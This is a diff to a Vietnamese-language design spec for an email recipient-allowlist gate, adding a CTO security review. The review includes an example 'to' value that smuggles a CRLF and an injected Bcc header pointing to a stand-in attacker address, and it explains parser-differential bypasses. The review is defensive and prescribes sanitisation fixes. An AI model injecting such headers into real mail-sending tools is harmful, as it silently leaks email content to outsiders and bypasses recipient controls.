@@ -1,6 +1,6 @@
 # Design: Gmail recipient-control gate (tier-high-exfil destination bound)
 
-**Ngày:** 2026-06-09 · **Vai trò:** technical consultant · **Trạng thái:** 🟡 spec viết xong → **gửi CTO review** (deliverable 4). Implementation chỉ bắt đầu sau khi CTO duyệt VÀ mechanism PR #8 merge.
+**Ngày:** 2026-06-09 · **Vai trò:** technical consultant · **Trạng thái:** 🔴 CTO REVIEWED (§9) — model DUYỆT nhưng **CONDITIONAL**: allowlist một mình bị vượt mặt bởi **RFC 2822 header-injection** (`gmail.ts:206` nối raw to/subject/body) → bắt buộc **F1 sanitize handler + F2 canonical-parse** trước flip `gmail_send`. Implementation sau PR #8 merge + F1/F2 fold.
 
 > **TL;DR:** `gmail_send` là tool tier-high-exfil **duy nhất** (gdrive/gcal đã verify own-resource). CTO không ký mở `gmail_send` trần — bắt buộc 1 control-đích. Spec này thêm **recipient-allowlist gate**: tool tự-khai `recipientField`; runtime kiểm recipient (đã resolve) phải khớp **operator env allowlist** (`WORKFLOW_RECIPIENT_ALLOWLIST`), nếu không → fail-closed THROW. Không phải confirm-machinery (tôn trọng no-confirm của user) — chỉ chặn vector exfil. Gmail cần **3 điều kiện** để chạy: `workflowSafe:true` (flip) + allowlist set + recipient khớp.
 
@@ -142,3 +142,31 @@ Thiếu bất kỳ → fail-closed. Defense-in-depth: flip (code) ⊥ allowlist 
 spec mechanism `2026-06-08-workflow-high-blast-design.md` · comms `consultant-to-cto-workflow-high-blast` (CTO verdict + tier confirm) · PR #8 (mechanism) · [[connectors-oauth]] (self-declare idiom) · [[workflow-orchestration-architecture]] (#3 đích-safety).
 
 **→ CTO review (deliverable 4):** allowlist-domain qua operator env + self-declared recipientField + all-recipients-strict + fail-closed. Duyệt → implement (sau PR #8 merge) → flip `gmail_send`.
+
+---
+
+## 9. CTO REVIEW — 2026-06-09: model DUYỆT · 🔴 CONDITIONAL (đóng header-injection trước flip)
+
+**Method:** đọc spec + **verify handler `gmail_send` thật** (`gmail.ts:201-219`).
+
+### ✅ Security MODEL — đúng, duyệt
+Allowlist ở **operator-env** (không author-widenable, G2) · fail-closed mọi nhánh (G4 empty / no-`@` / empty-list) · **G5 strict-all-match** (chống comma-injection) · enforce **sau interpolate** (recipient đã resolve) trên real-run · defense-in-depth 3 điều kiện. Tầng & trục đúng.
+
+### 🔴 BLOCKER (verified) — allowlist BỊ VƯỢT MẶT ở tầng parsing
+`gmail.ts:206-212` nối **raw** `to`/`subject`/`body` vào RFC 2822 headers, KHÔNG sanitize CRLF. Hệ quả:
+1. **Header injection qua `to`:** `to="ok@company.com\r\nBcc: evil@x.com"` → header `Bcc:` tiêm thêm → Gmail gửi Bcc; gate split-`,` KHÔNG thấy.
+2. **Bcc qua `subject`/`body`:** cũng nối raw → attacker tiêm Bcc qua trường gate **không đụng tới** → recipient-gate hoàn hảo trên `to` vẫn **vô dụng**.
+3. **Parser differential:** gate split-`,` đơn giản ≠ RFC 2822 (quoted-comma `"Smith, John" <x>`, comment `(...)`, display-name) → đích gate-thấy ≠ đích Gmail-gửi.
+⇒ **Allowlist một mình KHÔNG đủ.** (Pre-existing vuln — chat-side `gmail_send` cũng dính; sửa bất kể spec này.)
+
+### Bắt buộc TRƯỚC khi flip `gmail_send` (thêm vào spec)
+- **F1 — Sanitize handler (`gmail.ts`):** REJECT bất kỳ `to`/`subject`/`body` chứa `\r`/`\n` (hoặc encode đúng RFC 2822). Fix tầng connector → bảo vệ CẢ chat lẫn workflow. Test: `to`/`subject`/`body` có CRLF → throw.
+- **F2 — Canonical recipient parse (1 hàm dùng chung gate+handler):** parse `to` → list **bare `local@domain`** đã validate (loại CRLF/comment/display-name-có-comma/nhiều-`@`); **gate kiểm list canonical đó**, handler gửi đúng list đó (dựng lại sạch). Xóa differential. §3.2 phải đặc tả parse CHÍNH XÁC này (hiện để ngỏ).
+- Test 🔴 mới: header-injection qua to **và** qua subject/body → throw, KHÔNG execute.
+
+### 🟡 Thứ cấp
+- `recipientField` đơn-trường ổn **hôm nay** (gmail chỉ có `to`). Nếu sau thêm `cc`/`bcc` → phải cover (cân nhắc `recipientFields: string[]` + test fail nếu xuất hiện send-field mới).
+- Gate này **kế thừa** tính security-critical của seam dry-run/real-run (PR #8): nếu real-run lọt nhánh mock thì gate bị skip → review **cùng** PR #8.
+
+### Verdict
+**Model ✅ duyệt. Spec 🔴 CONDITIONAL:** thêm F1+F2 (sanitize handler + canonical parse) vào §3/§5/§6 → đó mới là điều kiện thật để flip `gmail_send`, KHÔNG chỉ allowlist. Implement sau PR #8 merge; gửi CTO xác nhận F1/F2 đã fold trước flip. — *CTO, 2026-06-09.*
